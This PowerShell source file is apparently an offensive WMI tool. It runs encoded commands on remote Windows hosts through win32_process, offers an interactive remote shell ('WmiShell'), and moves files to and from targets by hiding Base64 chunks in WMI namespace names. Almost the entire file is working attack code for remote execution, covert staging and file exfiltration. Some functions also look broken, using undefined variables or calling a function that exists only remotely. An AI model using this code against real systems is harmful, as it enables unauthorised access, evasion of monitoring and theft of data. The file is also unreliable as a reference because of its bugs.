function New-WmiSession {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter()]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter()]
    [string]
    $Namespace = "root\default",
    
    [Parameter()]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4)

) # End Param

#Check for existence of WMI Namespace specified by user
if ($Namespace -ne "default") {
    $checkNmspc = [bool](Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace "root" -Class __Namespace -ErrorAction SilentlyContinue | ? {$_.Name -eq $Namespace})
    if (!$checkNmspc) {
        $null = Set-WmiInstance -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Namespace "root" -Class __Namespace -Arguments @{Name=$Namespace}
    }
}

$props = @{
            'ComputerName' = $ComputerName
            'UserName' = Get-Credential -Credential $UserName
            'Namespace' = "root\" + $Namespace
            'Tag' = $Tag
}

New-Object -TypeName PSObject -Property $props

}

function Invoke-WmiExpression {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter()]
    [ValidateNotNullOrEmpty()]
    [ScriptBlock]
    $ScriptBlock,

    [Parameter(Position = 0, ParameterSetName = 'FilePath' )]
    [ValidateNotNullOrEmpty()]
    [String]
    $Path

) # End Param

    if ($PSBoundParameters['Path']) {
        $null = Get-ChildItem $Path -ErrorAction Stop
        $ScriptBytes = [IO.File]::ReadAllBytes((Resolve-Path $Path))
    }
    else {
        $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($ScriptBlock)
    }

    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    $outEnc = $EncodedCompressedScript -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
    $nop = [Math]::Floor($outEnc.Length / 5500)
    if ($outEnc.Length -gt 5500) {
        $lastp = $outEnc.Substring($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
        $outEnc = $outEnc.Remove($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
        for($i = 1; $i -le $nop; $i++) { 
	        $piece = $outEnc.Substring(0,5500)
		    $outEnc = $outEnc.Substring(5500,($outEnc.Length - 5500))
		    Upload-Piece -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Piece $piece -Count $i
        }
        $outEnc = $lastp
    }
	Upload-Piece -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Piece $outEnc -Count ($nop + 1)

    $remoteScript = @"
    `$getB64strings = Get-WmiObject -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {`$_.Name} | Sort-Object
    foreach (`$line in `$getB64strings) {
		`$cleanString = `$line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		`$reconstructed += `$cleanString
    }
    Set-Alias a New-Object
    Try { `$Script = (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('`$reconstructed'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() }
    Catch [System.Management.Automation.MethodInvocationException] {
	    Try { `$Script = (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('`$reconstructed' + '='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() }
	    Catch [System.Management.Automation.MethodInvocationException] {
		    `$Script = (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('`$reconstructed' + '=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() }
	    Finally {}
    }
    Finally { Invoke-Expression `$Script }
"@
    $scriptBlock = [scriptblock]::Create($remoteScript)
    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
                    
    # Wait for script to finish writing output to WMI namespaces
    $outputReady = ""
    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
    until($outputReady)
    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                    
    # Retrieve cmd output written to WMI namespaces 
    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName
}

function Enter-WmiShell {

Param (	
        [Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		
        [Parameter()]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
) # End Param
     
        # Start WmiShell prompt
        $command = ""
        do{ 
            # Make a pretty prompt for the user to provide commands at
            Write-Host ("[" + $ComputerName + "]: WmiShell>") -nonewline -foregroundcolor green 
            $command = Read-Host

            # Execute commands on remote host 
            switch ($command) {
               "exit" { 
                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace `
                    -Query "SELECT * FROM __Namespace WHERE Name LIKE 'EVILLTAG%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                }
                default { 
                    $remoteScript = @"
    Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
    `$wshell = New-Object -c WScript.Shell
    function Insert-Piece(`$i, `$piece) {
        `$count = `$i.ToString()
	    `$zeros = "0" * (6 - `$count.Length)
	    `$tag = $Tag + `$zeros + `$count
	    `$piece = `$tag + `$piece 
	    `$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
    }
	`$Exec = `$wshell.Exec("%comspec% /c " + "$command") 
	`$Out = `$Exec.StdOut.ReadAll()
    `$outEnc = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$Out))
    `$outEnc = `$outEnc -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
    `$nop = [Math]::Floor(`$outEnc.Length / 5500)
    if (`$outEnc.Length -gt 5500) {
        `$lastp = `$outEnc.Substring(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
        `$outEnc = `$outEnc.Remove(`$outEnc.Length - (`$outEnc.Length % 5500), (`$outEnc.Length % 5500))
        for(`$i = 1; `$i -le `$nop; `$i++) { 
	        `$piece = `$outEnc.Substring(0,5500)
		    `$outEnc = `$outEnc.Substring(5500,(`$outEnc.Length - 5500))
		    Insert-Piece `$i `$piece
        }
        `$outEnc = `$lastp
    }
	Insert-Piece (`$nop + 1) `$outEnc 
	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
"@
                    $scriptBlock = [scriptblock]::Create($remoteScript)
                    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
                    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh
                    
                    # Wait for script to finish writing output to WMI namespaces
                    $outputReady = ""
                    do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                    until($outputReady)
                    $null = Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                    
                    # Retrieve cmd output written to WMI namespaces 
                    Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName
                }
            }
        }until($command -eq "exit")
}

function Upload-Piece {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,

    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),

    [Parameter()]
    [string]
    $Piece,

    [Parameter()]
    [int]
    $Count

) # End Param

    $Count = $Count.ToString()
	$Zeros = "0" * (6 - $Count.Length)
	$Tag = $Tag + $Zeros + $Count
	$Piece = $Tag + $Piece 
	$null = Set-WmiInstance -ComputerName $ComputerName -Credential $UserName -EnableAllPrivileges -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=$Piece}
}

function Upload-WmiFile {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,

    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter(Mandatory = $True)]
    [string]
    $LocalPath,
    
    [Parameter(Mandatory = $True)]
    [string]
    $RemoteDestination

) #End Param

    $encFile = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($LocalPath))
    $outEnc = $encFile -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
    $nop = [Math]::Floor($outEnc.Length / 5500)
    if ($outEnc.Length -gt 5500) {
        $lastp = $outEnc.Substring($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
        $outEnc = $outEnc.Remove($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
        for($i = 1; $i -le $nop; $i++) { 
	        $piece = $outEnc.Substring(0,5500)
		    $outEnc = $outEnc.Substring(5500,($outEnc.Length - 5500))
		    Upload-Piece -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Piece $piece -Count $i
        }
        $outEnc = $lastp
    }
	Upload-Piece -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Piece $outEnc -Count ($nop + 1) 
	
    $remoteScript = @"
    `$getB64strings = Get-WmiObject -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {`$_.Name} | Sort-Object
    foreach (`$line in `$getB64strings) {
		`$cleanString = `$line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		`$reconstructed += `$cleanString
    }
    Try { `$DecodedByteArray = [System.Convert]::FromBase64String(`$reconstructed) }
    Catch [System.Management.Automation.MethodInvocationException] {
	    Try { `$DecodedByteArray = [System.Convert]::FromBase64String(`$reconstructed + "=") }
	    Catch [System.Management.Automation.MethodInvocationException] {
		    `$DecodedByteArray = [System.Convert]::FromBase64String(`$reconstructed + "==") }
	    Finally {}
    }
    Finally { [System.IO.File]::WriteAllBytes("$RemoteDestination", `$DecodedByteArray) }
"@
    $scriptBlock = [scriptblock]::Create($remoteScript)
    $encPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $scriptBlock
    $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $encPosh    
}

function Upload-WmiScript {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter(Mandatory = $True)]
    [string]
    $LocalPath
) #End Param

    $encScript = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($LocalPath))
    $outEnc = $encScript -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
    $nop = [Math]::Floor($outEnc.Length / 5500)
    if ($outEnc.Length -gt 5500) {
        $lastp = $outEnc.Substring($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
        $outEnc = $outEnc.Remove($outEnc.Length - ($outEnc.Length % 5500), ($outEnc.Length % 5500))
        for($i = 1; $i -le $nop; $i++) { 
	        $piece = $outEnc.Substring(0,5500)
		    $outEnc = $outEnc.Substring(5500,($outEnc.Length - 5500))
		    Insert-Piece $i $piece
        }
        $outEnc = $lastp
    }
	Insert-Piece ($nop + 1) $outEnc 
	$null = Set-WmiInstance -ComputerName $ComputerName -Credential $UserName -EnableAllPrivileges -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='UPLOAD_READY'}
    
    $remoteScript = @"
    Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'UPLOAD_READY'" | Remove-WmiObject
    `$getB64strings = Get-WmiObject -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
    foreach (`$line in `$getB64strings) {
		`$cleanString = `$line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		`$reconstructed += `$cleanString
    }
    Try { `$DecodedByteArray = [System.Convert]::FromBase64String(`$reconstructed) }
    Catch [System.Management.Automation.MethodInvocationException] {
	    Try { `$DecodedByteArray = [System.Convert]::FromBase64String(`$reconstructed + "=") }
	    Catch [System.Management.Automation.MethodInvocationException] {
		    `$DecodedByteArray = [System.Convert]::FromBase64String(`$reconstructed + "==") }
	    Finally {}
    }
    Finally { `$ScriptBlock = [System.Text.Encoding]::UTF8.GetString(`$DecodedByteArray) }
"@
}

function Download-WmiFile {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),

    [Parameter()]
    [UInt64]
    $BufferSize = (4 * 1024 * 1024),
    
    [Parameter(Mandatory = $True)]
    [string]
    $RemotePath,
    
    [Parameter(Mandatory = $True)]
    [string]
    $LocalDestination

) #End Param
    
    $RemoteScript = @"
function Insert-Piece(`$i, `$piece) {
    `$Count = `$i.ToString()
`$Zeros = "0" * (6 - `$Count.Length)
`$Tag = "$Tag" + `$Zeros + `$Count
`$Piece = `$Tag + `$piece + `$Tag
`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
}
function Insert-EncodedChunk (`$ByteBuffer) {
    `$EncodedChunk = [Convert]::ToBase64String(`$ByteBuffer)
    `$WmiEncoded = `$EncodedChunk -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
    `$nop = [Math]::Floor(`$WmiEncoded.Length / 5500)
    if (`$WmiEncoded.Length -gt 5500) {
        `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
        `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
        for(`$i = 1; `$i -le `$nop; `$i++) { 
       `$piece = `$WmiEncoded.Substring(0,5500)
   `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
    Insert-Piece `$i `$piece
        }
        `$WmiEncoded = `$LastPiece
    }
    Insert-Piece (`$nop + 1) `$WmiEncoded
    Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='CHUNK_READY'}
}
[UInt64]`$FileOffset = 0
`$BufferSize = $BufferSize
`$FileStream = New-Object System.IO.FileStream "$RemotePath",([System.IO.FileMode]::Open)
`$BytesLeft = `$FileStream.Length
if (`$FileStream.Length -gt `$BufferSize) {
    [Byte[]]`$ByteBuffer = New-Object Byte[] `$BufferSize
    do {
        `$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin)
        `$FileStream.Read(`$ByteBuffer, 0, `$BufferSize)
        [UInt64]`$FileOffset += `$ByteBuffer.Length
        `$BytesLeft -= `$ByteBuffer.Length
        Insert-EncodedChunk `$ByteBuffer
        `$ChunkDownloaded = ""
        do {`$ChunkDownloaded = Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like 'CHUNK_DOWNLOADED'"
        } until (`$ChunkDownloaded)
        Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject
    } while (`$BytesLeft -gt `$BufferSize)
}
`$ByteBuffer = `$null
[Byte[]]`$ByteBuffer = New-Object Byte[] (`$BytesLeft)
`$FileStream.Seek(`$FileOffset, [System.IO.SeekOrigin]::Begin)
`$FileStream.Read(`$ByteBuffer, 0, `$BytesLeft)
Insert-EncodedChunk `$ByteBuffer
`$FileStream.Flush()
`$FileStream.Dispose()
`$FileStream = `$null
`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='DOWNLOAD_COMPLETE'}
"@
    $ScriptBlock = [ScriptBlock]::Create($RemoteScript)
    $EncodedPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock
    $null = Invoke-WmiMethod -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh

    $DownloadComplete = ""
    do {
        Get-WmiChunk -ComputerName $ComputerName -UserName $UserName -Namespace $Namespace -Tag $Tag -Path $LocalDestination
        $DownloadComplete = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'DOWNLOAD_COMPLETE'"
    } until ($DownloadComplete)
    Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'DOWNLOAD_COMPLETE' or Name LIKE 'CHUNK_DOWNLOADED'" | Remove-WmiObject
}

function Get-WmiChunk {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter(Mandatory = $True)]
    [string]
    $Path

) # End Param
    
    $Reconstructed = New-Object System.Text.StringBuilder

    $ChunkReady = ""
    do {$ChunkReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'CHUNK_READY'"
    } until ($ChunkReady)

    Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'CHUNK_READY'" | Remove-WmiObject
    
    $GetB64Strings = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
    
    foreach ($line in $GetB64Strings) {
        $CleanString = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
        $CleanString = $CleanString.Remove($CleanString.Length - 14, 14)
        $null = $Reconstructed.Append($CleanString)
    }
        
    if ($Reconstructed.ToString().Length % 4 -ne 0) { $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4))) }

    [Byte[]]$DecodedByteArray = [Convert]::FromBase64String($Reconstructed)

    $FileStream = New-Object System.IO.FileStream $Path,([System.IO.FileMode]::Append)
    $null = $FileStream.Seek(0, [System.IO.SeekOrigin]::End)
    $FileStream.Write($DecodedByteArray, 0, $DecodedByteArray.Length)
    $FileStream.Flush()
    $FileStream.Dispose()
    $FileStream = $null    

    $null = Set-WmiInstance -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name="CHUNK_DOWNLOADED"}
}

function Get-WmiShellOutput{
<#
.SYNOPSIS
Retrieves Base64 encoded data stored in WMI namspaces and decodes it.
Author: Jesse Davis (@secabstraction)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION
Get-WmiShellOutput will query the WMI namespaces of specified remote host(s) for encoded data, decode the retrieved data and write it to StdOut.
 
.PARAMETER ComputerName 
Specifies the remote host to retrieve data from.
.PARAMETER UserName
Specifies the Domain\UserName to create a credential object for authentication, will also accept a PSCredential object. If this parameter
isn't used, the credentials of the current session will be used.
.EXAMPLE
PS C:\> Get-WmiShellOutput -ComputerName Server01 -UserName Administrator
.NOTES
This cmdlet was inspired by the work of Andrei Dumitrescu's python implementation.
.LINK
http://www.secabstraction.com/
#>

	Param (
		[Parameter(Mandatory = $True,
				   ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
		[string[]]$ComputerName,
		[Parameter(ValueFromPipeline = $True,
				   ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNull()]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$UserName = [System.Management.Automation.PSCredential]::Empty
	) #End Param
	
	$getOutput = @() 
	$getOutput = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | % {$_.Name} | Sort-Object
	
	if ([BOOL]$getOutput.Length) {
		
	    $reconstructed = ""

        #Decode Base64 output
		foreach ($line in $getOutput) {
			$cleanString = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
			$reconstructed += $cleanString
        }
        # Decode base64 padded string and remove front side spaces
	    Try { $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed)) }
        Catch [System.Management.Automation.MethodInvocationException] {
	        Try { $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed + "=")) }
	        Catch [System.Management.Automation.MethodInvocationException] {
		        $decodeString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reconstructed + "==")) }
	        Finally {}
	    }
        Finally { Write-Host $decodeString }
        
    }
	

	else {
        #Decode single line Base64
		$getStrings = $getOutput.Name
		$cleanString = $getStrings.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString)) }
		Catch [System.Management.Automation.MethodInvocationException] {
			Try { $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
			Catch [System.Management.Automation.MethodInvocationException] {
			    $decodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
			Finally {}
		}
		Finally { Write-Host $decodedOutput }    
    }
}

function Get-WmiFile {
Param (	
    [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string[]]
    $ComputerName,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [ValidateNotNull()]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]
    $UserName = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Namespace = "root\default",
    
    [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
    [string]
    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
    
    [Parameter(Mandatory = $True)]
    [string]$Path

) # End Param

    $getB64strings = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
    foreach ($line in $getB64strings) {
		$cleanString = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
		$reconstructed += $cleanString
    }
    Try { $DecodedByteArray = [System.Convert]::FromBase64String($reconstructed) }
    Catch [System.Management.Automation.MethodInvocationException] {
	    Try { $DecodedByteArray = [System.Convert]::FromBase64String($reconstructed + "=") }
	    Catch [System.Management.Automation.MethodInvocationException] {
		    $DecodedByteArray = [System.Convert]::FromBase64String($reconstructed + "==") }
	    Finally {}
    }
    Finally { [System.IO.File]::WriteAllBytes($Path, $DecodedByteArray) }
}
